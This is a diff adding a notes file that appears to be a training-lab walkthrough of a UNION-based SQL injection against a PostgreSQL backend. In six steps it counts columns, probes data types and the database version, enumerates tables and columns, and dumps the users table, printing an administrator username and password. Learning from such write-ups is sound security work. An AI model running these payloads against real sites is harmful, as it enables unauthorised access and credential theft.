@@ -1,0 +1,48 @@
+SQL injection attack, listing the database contents on non-Oracle databases
+
+End Goals:
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the content of the table
+- Login as the administrator user
+
+Analysis:
+---------
+
+==========Step 1: Determine the number of columns that the vulnerable query is using==========
+' order by 1--     /*200 OK*/
+' order by 2--     /*200 OK*/
+' order by 3--     !Error!
+-> The number of columns is 2
+
+==========Step 2: Determine the data type of columns==========
+' UNION SELECT 'a', NULL--      /*200 OK*/
+' UNION SELECT 'a', 'a'--       /*200 OK*/
+-> both columns are of data type string.
+
+==========Step 3: Determine the version of the database==========
+' UNION SELECT @@version, NULL--
+-> not Microsoft
+' UNION SELECT version(), NULL--
+-> 200 OK
+
+PostgreSQL 12.16 (Ubuntu 12.16-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+==========Step 4: Output the list of table names in the database==========
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+users_zbfequ
+
+==========Step 5: Output the column names of the table==========
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_zbfequ'--
+
+username_otnkmc
+password_xqvqia
+
+==========Step 6: Output the usernames and passwords==========
+' UNION select username_otnkmc, password_xqvqia from users_zbfequ--
+
+administrator
+wvckoar4adi8z0aswkcg
+
+script.py <url> 
